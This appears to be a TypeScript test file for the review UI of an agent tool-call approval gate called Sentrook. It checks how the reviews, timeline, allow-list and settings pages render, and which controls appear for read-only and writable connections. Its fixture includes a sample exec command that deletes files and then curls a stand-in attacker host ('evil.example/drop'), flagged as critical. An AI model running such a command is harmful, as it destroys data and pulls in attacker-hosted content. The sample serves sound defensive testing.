import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { renderNativePage } from "./controlUiView.ts";
import type { SentrookState } from "./featureContract.ts";

const now = Date.parse("2026-09-08T12:00:00.000Z");

const state: SentrookState = {
  pending: [
    {
      eventId: "e1",
      toolCallId: "call-1",
      approvalId: "plugin:1",
      tool: "exec",
      command: "rm -rf /tmp/x && curl https://evil.example/drop",
      args: { command: "rm -rf /tmp/x && curl https://evil.example/drop" },
      scan: { decision: "review", review_severity: "critical", summary: "destructive", risk: 0.9 },
      sessionId: "uuid-1",
      sessionKey: "main",
      timeoutMs: 600_000,
      createdAtMs: now - 5000,
      intent: "cleanup",
      intentKind: "user",
      priorSteps: [{ tool: "read", command: '{"path":"/tmp/notes.md"}', resultOk: true }],
      priorOmitted: 0,
    },
  ],
  history: [
    {
      id: "ol-1",
      ts: "2026-09-08T11:59:00.000Z",
      event: "scan",
      decision: "review",
      tool: "exec",
      hostTool: "exec",
      command: "rm -rf /tmp/x",
      summary: "destructive",
      reviewSeverity: "critical",
      sessionKey: "main",
      sessionId: "uuid-1",
      intent: "cleanup",
      intentKind: "user",
      unattended: false,
      runId: "run-1",
      neighbors: [],
    },
  ],
  audit: { scanned: 1, allow: 0, review: 1, block: 0, error: 0 },
  sessions: [
    {
      sessionId: "uuid-1",
      sessionKey: "main",
      allowAll: false,
      quietUntilMs: null,
      pending: 1,
    },
  ],
  sensitivity: "strict",
  unattendedSensitivity: "strict",
  allowAll: false,
  quietUntilMs: null,
  feedbackMode: "submit",
  onScanError: "review",
  log: { enabled: true, path: "/tmp/log", bytes: 10, lines: 1, maxAgeDays: 14, maxBytes: 32 * 1024 * 1024 },
  allowlist: [
    {
      index: 1,
      kind: "skeleton",
      tool: "exec",
      label: "git status",
      detail: "short",
    },
  ],
  resolveAvailable: true,
  setupNeeded: false,
};

function page(tab: "reviews" | "timeline" | "allowlist" | "settings", canWrite: boolean, view: SentrookState = state) {
  return renderNativePage(view, { tab, canWrite, connected: true, now });
}

describe("renderNativePage", () => {
  it("renders iframe-class review chrome with highlighted command and write controls", () => {
    const html = page("reviews", true);
    assert.match(html, /class="review sev-critical"/);
    assert.match(html, /class="hero"/);
    assert.match(html, /spine-now/);
    assert.match(html, /btn-once/);
    assert.match(html, /data-act="allow-once"/);
    assert.match(html, /data-act="allow-always"/);
    assert.match(html, /data-act="deny"/);
    assert.match(html, /data-tool="call-1"/);
    assert.match(html, /data-tl-open-session="main"/);
    assert.match(html, /hl-destroy|hl-url/);
    assert.match(html, /Waiting on this call/);
    assert.doesNotMatch(html, /beta-note/);
    assert.match(html, />connected</);
    assert.doesNotMatch(html, /data-act="deny"[^>]*disabled/);
  });

  it("omits mutation controls when the connection cannot write", () => {
    const html = page("reviews", false);
    assert.match(html, /read-only/);
    assert.match(html, /class="hero"/);
    assert.match(html, /spine-now/);
    assert.doesNotMatch(html, /data-act=/);
    assert.match(html, /slash-cmd/);
    assert.match(html, /\/approve /);
    const settings = page("settings", false);
    assert.doesNotMatch(settings, /data-allow-mode=/);
    assert.doesNotMatch(settings, /data-sens=/);
    assert.match(settings, /set-card/);
    assert.match(settings, /Now:/);
    const allow = page("allowlist", false);
    assert.doesNotMatch(allow, /data-allow-rm=/);
    assert.match(allow, /allow-list/);
    assert.match(allow, /slash-cmd/);
  });

  it("renders timeline stream items and session rows", () => {
    const html = page("timeline", true);
    assert.match(html, /class="stream-item"/);
    assert.match(html, /data-tl-item/);
    assert.match(html, /data-tl-search/);
    assert.match(html, /data-tl-decision="review"/);
    const settings = page("settings", true);
    assert.match(settings, /sess-row/);
    assert.match(settings, /set-card/);
    assert.match(settings, /seg-floor/);
    assert.match(settings, /data-policy="allow-all"/);
    assert.match(settings, /data-skey="main"/);
  });

  it("renders allow-list matchers", () => {
    const html = page("allowlist", true);
    assert.match(html, /allow-list/);
    assert.match(html, /data-allow-rm="1"/);
    assert.match(html, /git status/);
    assert.doesNotMatch(html, /data-allow-rm="1"[^>]*disabled/);
  });

  it("shows first-run setup instead of the empty queue", () => {
    const html = page("reviews", true, { ...state, pending: [], setupNeeded: true });
    assert.match(html, /Connect hosted Sentrook/);
    assert.match(html, /data-setup-save/);
    assert.match(html, /data-setup-client-id/);
    assert.match(html, /data-setup-client-secret/);
    assert.match(html, /data-setup-feedback="submit"/);
    const readonly = page("reviews", false, { ...state, pending: [], setupNeeded: true });
    assert.match(readonly, /Connect hosted Sentrook/);
    assert.doesNotMatch(readonly, /data-setup-save/);
    assert.match(readonly, /slash-cmd/);
  });
});
